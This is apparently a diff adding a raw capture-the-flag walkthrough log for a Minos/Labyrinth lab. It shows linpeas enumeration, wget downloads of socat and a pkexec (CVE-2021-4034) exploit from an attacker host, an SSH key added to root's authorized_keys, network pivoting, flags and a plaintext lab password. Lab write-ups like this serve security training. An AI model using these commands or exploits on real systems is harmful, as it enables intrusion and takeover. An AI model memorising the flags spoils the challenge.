@@ -1465,3 +1465,737 @@ drwxr-xr-x 90 root root  179 Aug 20  2020 ..
 ═╣ Can I read root folder? .............. No
 
 ╔══════════╣ Searching root files in home dirs (limit 30)
+/root/
+
+╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
+
+╔══════════╣ Readable files belonging to root and readable by me but not world readable
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/home/minos/.config/lxc/config.yml
+/home/minos/.gnupg/pubring.kbx
+/home/minos/.gnupg/trustdb.gpg
+/var/log/auth.log
+/var/log/syslog
+
+logrotate 3.11.0
+
+╔══════════╣ Files inside /home/minos (limit 20)
+total 18
+drwxr-xr-x 7 minos minos   14 Jul  2 19:15 .
+drwxr-xr-x 3 minos minos    3 Aug  3  2020 ..
+drwxr-xr-x 5 minos minos    6 Aug  3  2020 .Website
+lrwxrwxrwx 1 minos minos    9 Aug  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 minos minos  220 Aug  3  2020 .bash_logout
+-rw-r--r-- 1 minos minos 3771 Aug  3  2020 .bashrc
+drwx------ 2 minos minos    3 Aug  3  2020 .cache
+drwxr-x--- 3 minos minos    3 Jul  2 19:15 .config
+drwx------ 3 minos minos    9 Jul  2 19:18 .gnupg
+-rw-r--r-- 1 minos minos  807 Aug  3  2020 .profile
+drwx------ 2 minos minos    3 Aug  4  2020 .ssh
+-rw------- 1 minos minos 7005 Aug 20  2020 .viminfo
+-rw-r--r-- 1 minos minos  960 Aug 20  2020 Crete_Shores
+-rw-r--r-- 1 minos minos   37 Aug  3  2020 Minos_Flag
+
+╔══════════╣ Files inside others home (limit 20)
+
+╔══════════╣ Searching installed mail applications
+
+╔══════════╣ Mails (limit 50)
+
+��════════╣ Backup files (limited 100)
+-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
+-rw-r--r-- 1 root root 1397 Jul 29  2020 /usr/share/sosreport/sos/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
+-rw-r--r-- 1 root root 1758 Mar 24  2020 /usr/share/sosreport/sos/plugins/ovirt_engine_backup.py
+-rw-r--r-- 1 root root 11755 Jul 29  2020 /usr/share/info/dir.old
+-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
+-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
+-rw-r--r-- 1 root root 5484 Apr 16  2018 /usr/share/nmap/scripts/http-backup-finder.nse
+-rw-r--r-- 1 root root 7251 Apr 16  2018 /usr/share/nmap/scripts/http-config-backup.nse
+-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /var/lib/mlocate/mlocate.db: regular file, no read permission
+
+╔══════════╣ Web files?(output limit)
+
+ /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 root root 6 Jul  2 15:50 /run/cloud-init/.instance-id
+-rw-r--r-- 1 root root 2 Jul  2 15:50 /run/cloud-init/.ds-identify.result
+
+-rw-r--r-- 1 root root 1531 Aug  3  2020 /etc/apparmor.d/cache/.features
+-rw------- 1 root root 0 Jul 29  2020 /etc/.pwd.lock
+-rw-r--r-- 1 minos minos 220 Aug  3  2020 /home/minos/.bash_logout
+-rw-r--r-- 1 landscape landscape 0 Jul 29  2020 /var/lib/landscape/.cleanup.user
+
+╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rw------- 1 minos minos 22 Jul  2 19:00 /tmp/tmp.ZjVr5CnWrw
+-rwxr-xr-x 1 minos minos 828098 Feb 10 20:38 /tmp/linpeas.sh
+-rw-r--r-- 1 minos minos 59 Jul  2 18:43 /tmp/evilconfig.cfg
+-rw-r--r-- 1 root root 51200 Aug  4  2020 /var/backups/alternatives.tar.0
+-rw-r--r-- 1 root root 31769 Aug  4  2020 /var/backups/apt.extended_states.0
+-rw-r--r-- 1 root root 135 Jul 29  2020 /var/backups/dpkg.statoverride.0
+-rw-r--r-- 1 root root 362 Jul 29  2020 /var/backups/dpkg.diversions.0
+-rw-r--r-- 1 root root 3370 Aug  3  2020 /var/backups/apt.extended_states.1.gz
+-rw-r--r-- 1 root root 548804 Aug  3  2020 /var/backups/dpkg.status.0
+
+╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+/dev/full
+/dev/fuse
+/dev/mqueue
+/dev/net/tun
+/dev/null
+/dev/ptmx
+/dev/random
+/dev/shm
+/dev/tty
+#)You_can_write_even_more_files_inside_last_directory
+
+/home
+/home/minos
+/run/lock
+/run/screen
+/tmp
+/tmp/.ICE-unix
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/tmp/.font-unix
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/crash
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/accounts-daemon.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/atd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/console-getty.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/cron.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/dbus.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/flaskserver.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/lxd.socket/cgroup.event_control
+lxc/Minos/system.slice/networkd-dispatcher.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/polkit.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/rsyslog.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/snapd.socket/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/ssh.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/system-getty.slice/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-journald.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-logind.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-networkd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-resolved.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/systemd-udevd.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/system.slice/unattended-upgrades.service/cgroup.event_control
+/var/lib/lxcfs/cgroup/memory/lxc/Minos/user.slice/cgroup.event_control
+/var/tmp
+
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
+
+╔══════════╣ Searching passwords in history files
+
+╔══════════╣ Searching *password* or *credential* files in home (limit 70)
+/bin/systemd-ask-password
+/bin/systemd-tty-ask-password-agent
+/etc/pam.d/common-password
+/usr/lib/git-core/git-credential
+/usr/lib/git-core/git-credential-cache
+/usr/lib/git-core/git-credential-cache--daemon
+/usr/lib/git-core/git-credential-store
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/lib/python2.7/dist-packages/keyring/credentials.pyc
+/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
+/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
+/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
+/usr/lib/python3/dist-packages/twisted/cred/credentials.py
+/usr/share/dns/root.key
+/usr/share/doc/git/contrib/credential
+/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
+/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
+/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
+/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
+ntial-wincred.cgit/contrib/credential/wincred/git-crede
+/usr/share/man/man1/git-credential-cache--daemon.1.gz
+/usr/share/man/man1/git-credential-cache.1.gz
+/usr/share/man/man1/git-credential-store.1.gz
+/usr/share/man/man1/git-credential.1.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/man/man7/gitcredentials.7.gz
+/usr/share/man/man8/systemd-ask-password-console.path.8.gz
+/usr/share/man/man8/systemd-ask-password-console.service.8.gz
+/share/man/man8/systemd-ask-password-wall.path.8.gz
+/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/nmap/nselib/data/passwords.lst
+/usr/share/nmap/scripts/creds-summary.nse
+/usr/share/nmap/scripts/http-domino-enum-passwords.nse
+/usr/share/nmap/scripts/ms-sql-empty-password.nse
+/usr/share/nmap/scripts/mysql-empty-password.nse
+  #)There are more creds/passwds files in the previous parent folder
+
+/usr/share/pam/common-password.md5sums
+/usr/share/ubuntu-advantage-tools/modules/credentials.sh
+/var/cache/debconf/passwords.dat
+/var/lib/cloud/instances/Minos/sem/config_set_passwords
+/var/lib/pam/password
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+,681 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+[0mords already ran (freq=once-per-instance) config-set-passw
+,929 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,929 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
+                                ╚════════════════╝
+Regexes to search for API keys aren't activated, use param '-r' 
+
+nameserver 127.0.0.53
+lxd
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      212/python          
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -      
+minos@Minos:/tmp$ netstat -tulpn
+netstat -tulpn
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      212/python          
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 10.71.235.7:68          0.0.0.0:*                           -                   
+udp6       0      0 fe80::216:3eff:fe8a:546 :::*                                -                   
+minos@Minos:/tmp$ wget http://10.8.19.103/socat
+wget http://10.8.19.103/socat
+--  http://10.8.19.103/socat
+Connecting to 10.8.19.103:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 375176 (366K) [application/octet-stream]
+Saving to: ‘socat’
+
+socat               100%[===================>] 366.38K   430KB/s    in 0.9s    
+
+(430 KB/s) - ‘socat’ saved [375176/375176]
+minos@Minos:/tmp$ chmod +x socat
+chmod +x socat
+
+minos@Minos:/tmp$ ./socat tcp-l:8081,fork,reuseaddr tcp:127.0.0.53:53 &
+./socat tcp-l:8081,fork,reuseaddr tcp:127.0.0.53:53 &
+[1] 9647
+
+nope
+
+minos@Minos:/$ nmap -sn 10.10.238.0-255
+nmap -sn 10.10.238.0-255
+
+Starting Nmap 7.60 ( https://nmap.org )
+WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+
+Nmap scan report for ip-10-10-238-88.eu-west-1.compute.internal (10.10.238.88)
+Host is up (0.0011s latency).
+Nmap scan report for ip-10-10-238-128.eu-west-1.compute.internal (10.10.238.128)
+Host is up (0.000021s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 14.18 seconds
+minos@Minos:/$ ping 10.10.238.88
+ping 10.10.238.88
+PING 10.10.238.88 (10.10.238.88) 56(84) bytes of data.
+64 bytes from 10.10.238.88: icmp_seq=1 ttl=63 time=0.375 ms
+64 bytes from 10.10.238.88: icmp_seq=2 ttl=63 time=0.738 ms
+64 bytes from 10.10.238.88: icmp_seq=3 ttl=63 time=0.398 ms
+
+minos@Minos:/$ nmap 10.10.238.88
+nmap 10.10.238.88
+
+Starting Nmap 7.60 ( https://nmap.org )
+WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+
+Nmap scan report for ip-10-10-238-88.eu-west-1.compute.internal (10.10.238.88)
+Host is up (0.0011s latency).
+Not shown: 991 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+111/tcp  open  rpcbind
+389/tcp  open  ldap
+3389/tcp open  ms-wbt-server
+5901/tcp open  vnc-1
+6001/tcp open  X11:1
+7777/tcp open  cbt
+7778/tcp open  interwise
+
+Nmap done: 1 IP address (1 host up) scanned in 1.49 seconds
+
+root@Minos:/root/.ssh# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDcGZZnZ/BkafcdrWpFJI2XZFGUS2+3KVC/gk253z9IDoaWRlH3sraR76XuhyRprJA3iN6GZITga5hE7MdkXaVyYWVQZNRvrLvOjfN+ig5lXTKs5dAal/GzkynkvrBFMgLHbzq4A9R2lOUe6s1RDnr9z+sZJGbl3ryuyW/lU8HAbfhWVqy/goIG+ddSpYraxm4Od/tlqpPesJjyFvqksp3mSTqy2740cbjkIEGsTrm0fnrZIrq8YfAi2juhoFf4vgX5APp0GbrczuErKxJjy9AmTupaFxJTi655Z3Y2zPuOnJitUunvzQEUxs1kMkIS0J+qT927KOMweiD7d1e3j64lfNQFJRHYxc0h8+h17rxqLu4SZCX64o75RInQaDP/9G4tn2hR+PGWYC3bOqDzygLgIiBMECBfYAqAqo4tz05BAc2ZAKjZ4278jLFwNJcxzTNjH358jj3xtoBtUR+x6PhXQf5ATG5siWuZn44vi+M6ZQcIOMDIqqXZ4qaO+4/ElEc= witty@kali" >> authorized_keys
+<OMDIqqXZ4qaO+4/ElEc= witty@kali" >> authorized_keys
+
+┌──(witty㉿kali)-[~/.ssh]
+└─$ ssh root@10.10.0.122
+Enter passphrase for key '/home/witty/.ssh/id_rsa': witty
+
+       -""\
+    .-"  .`)     (
+   j   .'_+     :[                )      .^--..
+  i    -"       |l                ].    /      i
+ ," .:j         `8o  _,,+.,.--,   d|   `:::;    b
+ i  :'|          "88p;.  (-."_"-.oP        \.   :
+ ; .  (            >,%%%   f),):8"          \:'  i
+i  :: j          ,;%%%:; ; ; i:%%%.,        i.   `.
+i  `: ( ____  ,-::::::' ::j  [:```          [8:   )
+<  ..``'::::8888oooooo.  :(jj(,;,,,         [8::  <
+`. ``:.      oo.8888888888:;%%%8o.::.+888+o.:`:'  |
+ `.   `        `o`88888888b`%%%%%88< Y888P""'-    ;
+   "`---`.       Y`888888888;;.,"888b."""..::::'-'
+          "-....  b`8888888:::::.`8888._::-"
+             `:::. `:::::O:::::::.`%%'|
+              `.      "``::::::''    .'
+                `.                   <
+                  +:         `:   -';
+                   `:         : .::/
+                    ;+_  :::. :..;;;       
+                    ;;;;,;;;;;;;;,;;
+
+┌──(witty㉿kali)-[~/.ssh]
+└─$ sshuttle -r root@10.10.0.122 10.10.0.0/24   
+[local sudo] Password: 
+Enter passphrase for key '/home/witty/.ssh/id_rsa': 
+                                                    c : Connected to server.
+
+root@Minos:/etc# ip addr
+ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+9: eth0@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    link/ether 00:16:3e:8a:01:39 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet 10.71.235.7/24 brd 10.71.235.255 scope global dynamic eth0
+       valid_lft 2834sec preferred_lft 2834sec
+    inet6 fd42:a113:181b:47f:216:3eff:fe8a:139/64 scope global dynamic mngtmpaddr noprefixroute 
+       valid_lft 3183sec preferred_lft 3183sec
+    inet6 fe80::216:3eff:fe8a:139/64 scope link 
+       valid_lft forever preferred_lft forever
+root@Minos:/etc# nmap 10.71.235.7
+nmap 10.71.235.7
+
+Starting Nmap 7.60 ( https://nmap.org )
+Nmap scan report for Minos.lxd (10.71.235.7)
+Host is up (0.0000050s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 1.59 seconds
+
+root@Minos:/etc# curl Minos.lxd:8080
+curl Minos.lxd:8080
+<html>
+	<head>
+	</head>
+	<body>
+		<pre>
+		King Minos of Crete was feared by all of the rulers
+		of the lands around him. When he demanded offerings
+		or men for his armies, all agreed to his demands.
+		When he demanded they send tributes to honour him,
+		they sent them without question.
+
+		But his demands on Athens became too great.
+
+		King Minos had constructed a great palace in Knossos.
+		Inside this palace he instructed Daedalus to be the 
+		architect of a great labyrinth, and, at the centre
+		of the maze he kept his wife's son - The Minotaur.
+
+		It was powerful, and savage, and would eat the flesh
+		of the offerings sent into the labyrinth by King Minos.
+		They would wander through the maze, completely lost, 
+		until at last they came face to face with the Minotaur.
+
+		As for Athens, Minos demanded every year the King send
+		him seven young men and women. One year, he sent his son:
+		Theseus.
+
+		Before leaving, Theseus' father gave him a letter with 
+		a message to help him on his way to Crete.
+
+		On the bottom of the letter was a message Theseus didn't
+		quite understand: 
+	        TGUE?O·S·K·MTUEGI·SYENFE·TOI···SRO·T·SF·OYT···O·T·KUMH·I·AE·NMK··	
+	
+
+		<img src="/static/Knossos.jpg" />
+	</body>
+continuing
+```
+```text
+# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.71.235.7  netmask 255.255.255.0  broadcast 10.71.235.255
+        inet6 fe80::216:3eff:fe8a:139  prefixlen 64  scopeid 0x20<link>
+        inet6 fd42:a113:181b:47f:216:3eff:fe8a:139  prefixlen 64  scopeid 0x0<global>
+        ether 00:16:3e:8a:01:39  txqueuelen 1000  (Ethernet)
+        RX packets 240  bytes 26136 (26.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 232  bytes 22258 (22.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 3133  bytes 791785 (791.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3133  bytes 791785 (791.7 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+```text
+# nmap -sn 10.71.235.255/24
+
+Starting Nmap 7.60 ( https://nmap.org )
+Nmap scan report for ip-10-71-235-1.eu-west-1.compute.internal (10.71.235.1)
+Host is up (0.000033s latency).
+MAC Address: FE:46:D7:FA:E5:31 (Unknown)
+Nmap scan report for Athens.lxd (10.71.235.37)
+Host is up (-0.088s latency).
+MAC Address: 00:16:3E:9E:36:DA (Xensource)
+Nmap scan report for Labyrinth.lxd (10.71.235.159)
+Host is up (-0.10s latency).
+MAC Address: 00:16:3E:65:94:47 (Xensource)
+Nmap scan report for Minos.lxd (10.71.235.7)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 4.81 seconds
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.0.7 - - [20/May/2024 13:22:02] "GET /linpeas.sh HTTP/1.1" 200 -
+
+entrance@Labyrinth:/home$ ls
+ariadne  entrance  minotaur
+entrance@Labyrinth:/home$ cd /tmp
+entrance@Labyrinth:/tmp$ ls
+systemd-private-0d01bcbdcd194c3e8200c71ab19c50b2-systemd-resolved.service-bTDT4Y
+entrance@Labyrinth:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
+--  http://10.8.19.103:8000/linpeas.sh
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828098 (809K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 808.69K   461KB/s    in 1.8s    
+
+(461 KB/s) - ‘linpeas.sh’ saved [828098/828098]
+
+entrance@Labyrinth:/tmp$ chmod +x linpeas.sh
+entrance@Labyrinth:/tmp$ ./linpeas.sh
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034
+
+Potentially Vulnerable to CVE-2022-2588
+
+-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ ls
+CVE-2021-4034.py  LICENSE  README.md
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ tail CVE-2021-4034.py 
+    print('[!] Failed to create gconf-modules config file.')
+    sys.exit()
+```
+```text
+# Convert the environment to an array of char*
+environ_p = (c_char_p * len(environ))()
+environ_p[:] = environ
+
+print('[+] Calling execve()')
+```
+```text
+# Call execve() with NULL arguments
+libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
+
+change to (if u did Red Room)
+
+https://github.com/joeammond/CVE-2021-4034
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ tail CVE-2021-4034.py 
+    print('[!] Failed to create gconf-modules config file.')
+    sys.exit()
+```
+```text
+# Convert the environment to an array of char*
+environ_p = (c_char_p * len(environ))()
+environ_p[:] = environ
+
+print('[+] Calling execve()')
+```
+```text
+# Call execve() with NULL arguments
+libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.0.7 - - [20/May/2024 13:37:30] "GET /CVE-2021-4034.py HTTP/1.1" 200 -
+
+entrance@Labyrinth:/tmp$ wget http://10.8.19.103:8000/CVE-2021-4034.py
+--  http://10.8.19.103:8000/CVE-2021-4034.py
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3262 (3.2K) [text/x-python]
+Saving to: ‘CVE-2021-4034.py’
+
+CVE-2021-4034.py    100%[===================>]   3.19K  --.-KB/s    in 0s      
+
+(250 MB/s) - ‘CVE-2021-4034.py’ saved [3262/3262]
+
+entrance@Labyrinth:/tmp$ python3 CVE-2021-4034.py
+[+] Creating shared library for exploit code.
+[-] GCONV_PATH=. directory already exists, continuing.
+[-] exploit directory already exists, continuing.
+[+] Calling execve()
+```
+```text
+# id
+uid=0(root) gid=1001(entrance) groups=1001(entrance)
+
+thx LSD00
+
+root@Labyrinth:/tmp# grep -iRl "thm{" /home/* 2>/dev/null
+grep -iRl "thm{" /home/* 2>/dev/null
+/home/ariadne/Minotaur_Flag
+/home/minotaur/Labyrinth_Flag
+```
+```text
+# cd /home
+```
+```text
+# ls
+ariadne  entrance  minotaur
+```
+```text
+# cd minotaur
+```
+```text
+# ls
+Labyrinth_Flag	Minotaur  ariadne  thread
+```
+```text
+# cat Labyrinth_Flag
+THM{6154ea526254375613650183962bf431}
+```
+```text
+# ls
+Labyrinth_Flag	Minotaur  ariadne  thread
+```
+```text
+# cd ..
+```
+```text
+# ls
+ariadne  entrance  minotaur
+```
+```text
+# cd ariadne
+```
+```text
+# ls
+Minotaur_Flag  TheReturn  ariadne
+```
+```text
+# cat Minotaur_Flag
+THM{c307b8045208fac06b9faa90e68d2ad4}
+```
+```text
+# ls -lah
+total 42K
+drwxr-xr-x 4 ariadne ariadne   11 Aug 20  2020 .
+drwxr-xr-x 5 root    root       5 Aug  3  2020 ..
+lrwxrwxrwx 1 root    root       9 Aug  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 ariadne ariadne  220 Aug  3  2020 .bash_logout
+-rw-r--r-- 1 ariadne ariadne 3.7K Aug  3  2020 .bashrc
+drwx------ 3 ariadne ariadne    3 Aug  3  2020 .gnupg
+-rw-r--r-- 1 ariadne ariadne  807 Aug  3  2020 .profile
+drwx------ 2 ariadne ariadne    5 Aug  4  2020 .ssh
+-rwxr----- 1 ariadne ariadne   38 Aug  3  2020 Minotaur_Flag
+-rwxr----- 1 ariadne ariadne  689 Aug 20  2020 TheReturn
+-rw-r--r-- 1 ariadne ariadne  30K Aug 20  2020 ariadne
+```
+```text
+# bash -i
+root@Labyrinth:/home/ariadne# cat TheReturn
+Despair set in and Theseus wondered
+if this was where his life would end, 
+down in the dark, all alone, next to
+the stinking body. Then his hand brushed
+a piece of string and, with a whoop
+of delight, he knew he had found the
+thread which would lead him back out of
+the labyrinth. As he neared the entrance,
+the darkness began to fade he made
+out the figure of Ariadne, waiting for
+his return.
+
+"You must take me back to Athens with you!"
+she cried, "My father will kill me when 
+he finds out that I have helped you."
+
+Theseus insisted she come with them, "it 
+would be crule to leave you here." Quickly
+and quietly, they unfurled the great black 
+sails of their ship and headed for home.
+
+root@Labyrinth:/home/ariadne# file ariadne
+ariadne: data
+
+root@Labyrinth:/home/minotaur# cat Minotaur
+Theseus walked carefully through the dark, 
+foul-smelling passages of the labyrinth, 
+expecting any moment to come face-to-face 
+with the creature. He did not have long to
+wait. Turning a corner, with his hands held
+out in front of him feeling his way, suddenly
+he touched what felt like a huge bony horn.
+
+In an instant his world turned upside down,
+quite literally. He was picked up between the
+Minotaurs horns and tossed high into the air.
+When he landed on the hard cold stone, he felt
+the animal's huge hooves come down on his 
+chest. Every last breath seemed to be knocked
+out of him and he struggled to stay alive in 
+the darkness.
+
+But Theseus the son of King Aegeus was both 
+brave and stubborn. As the Minotaur bellowed
+in his ear and grabbed at him, Theseus found a
+strength which he did not know he possessed.
+
+He grabbed the animal's huge horns, and kept
+on twisting the great head from side to side.
+As the animal grew weak, Theseus gave one almighty
+wrench on the head, turning it almost the whole way,
+The creature's neck snapped, it gurgled its 
+last breath and fell to the floor with an
+enormous thud.
+
+It was over, he had done it. The Minotaur was
+dead. All he has to do was make his way back 
+out of the Labyrinth... And at that moment he
+realized the awful mistake he had made. In the
+struggle with the Minotaur he had dropped the 
+string, his lifeline. Theseus felt all over
+the floor in the pitch darkness for the string.
+
+root@Labyrinth:/home/minotaur# file thread
+thread: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66742fe34842823ac968336a34a14a63d5e6df5f, not stripped
+root@Labyrinth:/home/minotaur# cat ariadne
+Username: ariadne
+Password: TheLover
+
+root@Labyrinth:/root# ls -lah
+total 14K
+drwx------  5 root root   10 Aug 20  2020 .
+drwxr-xr-x 22 root root   22 Jul 29  2020 ..
+lrwxrwxrwx  1 root root    9 Aug  3  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwx------  2 root root    3 Aug  3  2020 .cache
+drwx------  3 root root    3 Aug  3  2020 .gnupg
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root    4 Aug  4  2020 .ssh
+-rw-------  1 root root  12K Aug 20  2020 .viminfo
+-rw-r--r--  1 root root 1.6K Aug  3  2020 maze
+root@Labyrinth:/root# file maze
+maze: ASCII text
+root@Labyrinth:/root# cat -v maze
+88888888888888888888888888888888888888888888888888888888888888888888888
+88.._|      | `-.  | `.  -_-_ _-_  _-  _- -_ -  .'|   |.'|     |  _..88
+88   `-.._  |    |`!  |`.  -_ -__ -_ _- _-_-  .'  |.;'   |   _.!-'|  88
+88      | `-!._  |  `;!  ;. _______________ ,'| .-' |   _!.i'     |  88
+88..__  |     |`-!._ | `.| |_______________||."'|  _!.;'   |     _|..88
+88   |``"..__ |    |`";.| i|_|MMMMMMMMMMM|_|'| _!-|   |   _|..-|'    88
+88   |      |``--..|_ | `;!|l|MMoMMMMoMMM|1|.'j   |_..!-'|     |     88
